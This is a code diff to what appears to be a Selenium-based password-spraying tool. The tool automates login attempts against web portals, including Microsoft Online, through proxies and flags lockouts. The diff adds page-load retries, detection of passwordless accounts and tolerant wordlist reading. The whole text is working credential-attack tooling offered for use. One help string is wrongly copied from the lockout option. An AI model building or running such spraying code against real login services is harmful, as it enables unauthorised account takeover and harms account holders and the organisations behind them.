@@ -9,7 +9,7 @@ from selenium.webdriver import Keys
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support import expected_conditions as ec
 from selenium.webdriver.support.ui import WebDriverWait
-from selenium.common.exceptions import TimeoutException
+from selenium.common.exceptions import TimeoutException, WebDriverException
 from multiprocessing import Process
 import os
 import toml
@@ -78,6 +78,9 @@ def parse_arguments():
                                "strings can be provided comma seperated with no spaces.")
     optional.add_argument('-l', '--lockout', type=str,
                          help="(OPTIONAL) String(s) to look for to determine if the account has been locked. Multiple "
+                              "strings can be provided comma seperated with no spaces.")
+    optional.add_argument('-pl', '--passwordless', type=str, default="Other ways to sign in",
+                          help="(OPTIONAL) String(s) to look for to determine if the account has been locked. Multiple "
                               "strings can be provided comma seperated with no spaces.")
     optional.add_argument('-cb', '--checkbox', type=str,
                           help="(OPTIONAL) If a checkbox is required, provide a unique attribute of the checkbox, "
@@ -212,7 +215,7 @@ def print_ending(results):
 
 def import_txt_file(filename):
     data = []
-    with open(filename, "r") as file:
+    with open(filename, "r", encoding='utf-8', errors='ignore') as file:
         for line in file:
             data.append(line.rstrip())
     return data
@@ -371,7 +374,16 @@ def attempt_login(spray_config, proxy_url):
 
     driver.set_page_load_timeout(30)
     driver.delete_all_cookies()
-    driver.get(spray_config.url)
+    for i in range(3):
+        try:
+            driver.get(spray_config.url)
+            break
+        except WebDriverException:
+            if i == 2:
+                print(
+                    f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - ERROR - Could not load the URL: {spray_config.url}")
+                driver.close()
+                return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}
 
     # Wait until the username box loads
     try:
@@ -396,7 +408,6 @@ def attempt_login(spray_config, proxy_url):
     except TimeoutException:
         input_box.send_keys(Keys.RETURN)
         sleep(1)  # Wait for the page to load
-
         # Specific to the Microsoft Online login portal
         if "Microsoft" and "Work or school account" in driver.page_source:
             work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
@@ -411,6 +422,10 @@ def attempt_login(spray_config, proxy_url):
         driver.close()
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
         return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "LOCKED"}
+    elif list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.passwordless_auth):
+        driver.close()
+        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - PASSWORDLESS: {spray_config.username}")
+        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "PASSWORDLESS"}
 
     try:
         WebDriverWait(driver, 3).until(
